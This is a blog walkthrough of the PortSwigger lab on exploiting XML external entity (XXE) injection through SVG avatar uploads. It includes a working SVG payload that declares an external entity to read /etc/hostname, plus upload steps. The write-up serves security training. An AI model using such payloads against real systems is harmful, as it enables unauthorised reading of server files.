---
title: "Lab: Exploiting XXE via image file upload"
datePublished: Fri Jan 12 2024 12:03:41 GMT+0000 (Coordinated Universal Time)
cuid: clralb49e000a09l67av37wxj
slug: lab-exploiting-xxe-via-image-file-upload
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1704888704671/1224711c-8a99-4e6e-b12e-72c064f6d37b.png
tags: cybersecurity-1, websecurity, burpsuite, xxe, portswigger, handson

---

Lab Scenario: Our mission is to exploit XXE through an image file upload on a web application. By uploading a crafted SVG image, we intend to reveal the contents of a server file, in this case, `/etc/hostname`. Let's proceed with the solution:

1. **Crafting the Malicious SVG Image:**
    
    * Create a local SVG image with the following content:
        
        ```plaintext
        xmlCopy code<?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
          <text font-size="16" x="0" y="16">&xxe;</text>
        </svg>
        ```
        
2. **Posting a Comment with Image Upload:**
    
    * Post a comment on a blog post.
        
    * Upload the crafted SVG image as an avatar.
        
3. **Exploiting XXE:**
    
    * When you view your comment, the XXE payload in the SVG image will trigger, disclosing the contents of the `/etc/hostname` file.
        
4. **Submitting the Solution:**
    
    * Use the "Submit solution" button to submit the value of the server hostname obtained from the XXE exploitation.
        

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1704542707021/3049388c-cf57-46a4-a838-1c368be9678e.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1704542727756/88046229-f9e8-43aa-8112-5f6b6f521482.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1704542663108/8f16ca59-7de8-43a9-a7ce-9829ae199a4e.png align="left")

**Conclusion**: This lab exercise provides practical insights into exploiting XXE vulnerabilities through image file uploads. By following this step-by-step guide, users can deepen their understanding of XXE attacks and the potential risks associated with improper handling of XML input. Stay informed, keep learning, and continue exploring the dynamic field of cybersecurity to contribute to a more secure online environment.

**Reference**:

[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

[https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)